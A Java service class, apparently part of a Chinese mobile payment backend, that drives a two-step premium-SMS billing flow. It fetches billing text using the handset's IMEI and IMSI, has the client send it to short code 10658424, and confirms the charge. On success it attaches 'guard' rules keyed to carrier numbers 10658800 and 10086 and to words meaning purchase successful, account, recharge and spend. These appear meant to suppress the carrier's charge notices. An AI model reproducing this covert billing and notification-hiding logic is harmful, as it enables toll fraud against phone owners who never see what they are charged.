package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 强联网
 * mm强联网对接文档说明

	说明:mm强联网需要依次请求2个接口(url)完成计费.
	
	第一步、请求接口1（http://122.114.60.22:8001/sms.aspx?imei=934364670584161&imsi=460005109082249）得到类似下面的短信内容，
	MM#WLAN#G4Y/p48NOkLjTm+plGvYQQ==#337463621#399900002400，将得到的内容发送到10658424。
	
	参数说明：
	imei，手机的imei（取本机的）
	imsi，sim卡的imsi（取本机的）
	
	
	第二步、短信发出去后,需要等待3-5秒后!!!请求接口2（http://122.114.60.22:8001/synic.aspx?paycode=30000896016601&imei=934364670584161&imsi=460005109082249&channel=0000000000&pid=337463621）返回ok表示计费成功,返回其他为计费失败。如果没有等等3-5秒钟会出现“短信未到达”错误。
	
	参数说明：
	paycode，计费代码（例子里的30000896016601为0.01元代码）
	imei，手机的imei（取本机的跟第一步里的相同）
	imsi，sim卡的imsi（取本机的跟第一步里的相同）
	channel，渠道号（固定值0000000000）
	pid，第一步中请求接口1得到的短信内容中最后两个#号之间的内容,9位数字，如上面例子中的是337463621，这个值每次都不同,技术做处理!!!否则计费会失败!!!!!!!!!!!!!!!!!!!!!!

 * 
 * @author leoliu
 *
 */
public class LxtxSmm3DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(LxtxSmm3DynamicService.class);
	
	private static final String TYPE = "lxtxSmm3";
	
	private static final String PARAM1 = "imei={imei}&imsi={imsi}";
	private static final String PARAM2 = "paycode={paycode}&imei={imei}&imsi={imsi}&channel={channelid}&pid={pid}";
	
	private static final String DEST = "10658424";
	
	private static final String DEDAULT_CHANNEL_ID = "0000000000";
	
	private int timeOut = 60;
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		String theNo = map.get("theNo");
		
		if("1".equals(theNo)){
			return firstDynamic(map);
		}else if("2".equals(theNo)){
			return secondDynamic(map);
		}
		
		return null;
	}
	
	public String firstDynamic(Map<String, String> map) {
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			
			String param = PARAM1.replace("{imsi}",imsi).replace("{imei}",imei);
			
			String responseTxt = GetData.getData(url,param);
			
			xml = parseFirst(map,responseTxt);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(channel);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}

	private String parseFirst(Map<String, String> map,String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			logger.info("parse first : "+responseTxt);
			
			if(responseTxt.startsWith("MM#WLAN")){
				Sms sms = new Sms();
				
				sms.setSmsContent(responseTxt);
				sms.setSmsDest(DEST);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				String sid = fetchSid(responseTxt);
				
				Sets sets = new Sets();
				sets.setKey("sid");
				sets.setValue(sid);
				
				return XstreamHelper.toXml(sms).append(XstreamHelper.toXml(sets)).append("<wait>5</wait>").toString();
			}else if(responseTxt.equals("0")){

				Sets sets = new Sets();
				sets.setKey("sid");
				sets.setValue("111111111");
				
				return XstreamHelper.toXml(sets).toString();
			}
		}
		
		return null;
	}
	
	private static String fetchSid(String content){
		
		if(content != null && content.length() > 0){
			int pos0 = content.lastIndexOf("#");
			
			String aa = content.substring(0,pos0);
			
			pos0 = aa.lastIndexOf("#");
			
			return aa.substring(pos0+1);
		}
		
		return null;
	}
	
	private Map<String, Integer> tryMap1 = new HashMap<String, Integer>();
	
	private String secondDynamic(Map<String, String> map){
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			{
				
				String paycode = StringUtils.defaultString(map.get("paycode"));
				String imsi = StringUtils.defaultString(map.get("imsi"));
				String imei = StringUtils.defaultString(map.get("imei"));
				String channelid = StringUtils.defaultString(map.get("channelid"));
				String sid = map.get("sid");
				
				if(channelid.length() == 0){
					channelid = DEDAULT_CHANNEL_ID;
				}
				
				String param = PARAM2.replace("{paycode}",paycode).replace("{imsi}",imsi).replace("{imei}",imei).replace("{pid}",sid).replace("{channelid}",channelid);
				
				String responseTxt = GetData.getData(url,param);
				
				xml = parseSecond(map,responseTxt);
				
				if(xml != null && xml.length() > 0){
					tryMap.remove(channel);
				}else{
					logger.info("responseXml is null");
					
					Integer tryCnt = tryMap1.get(channel);
					
					if(tryCnt == null){
						tryCnt = 1;
						tryMap1.put(channel,tryCnt);
						
						return DynamicUtils.parseWait(10,map);
					}else{
						tryCnt = tryCnt + 1;
						
						if(tryCnt >= 3){
							tryMap1.remove(channel);
							return DynamicUtils.parseError("599");
						}else{
							tryMap1.put(channel,tryCnt);
							return DynamicUtils.parseWait(10,map);
						}
					}
				}
			}
			
		}
		
		return xml;
	}
	
	private String parseSecond(Map<String, String> map,String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			logger.info("parse second : "+responseTxt);
			
			if("ok".equals(responseTxt)){
				Sms sms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				guardList.add(guard1);
				guardList.add(guard2);
				guardList.add(guard3);
				guardList.add(guard4);
				
				sms.setGuardList(guardList);
				
				return XstreamHelper.toXml(sms).toString();
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		test2();
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://122.114.60.88:8009/sms.aspx");
		map.put("channel", "106208a001001001");
		map.put("imei","862949029214504");
		map.put("imsi", "460022101441340");
		map.put("theNo","1");
		map.put("type","lxtxSmm3");
		
		String xml = new LxtxSmm3DynamicService().dynamic(map);
		
		logger.info(xml);
	}
	
	private static void test2(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://122.114.60.88:8009/mpay.aspx");
		map.put("channel", "106208a001001001");
		map.put("imei","862949029214504");
		map.put("imsi", "460022101441340");
		map.put("theNo","2");
		map.put("type","lxtxSmm3");
		
		map.put("sid","111111111");
		map.put("channelid","0000000000");
		map.put("paycode","30000896015310");
		
		String xml = new LxtxSmm3DynamicService().dynamic(map);
		
		logger.info(xml);
	}
	
}
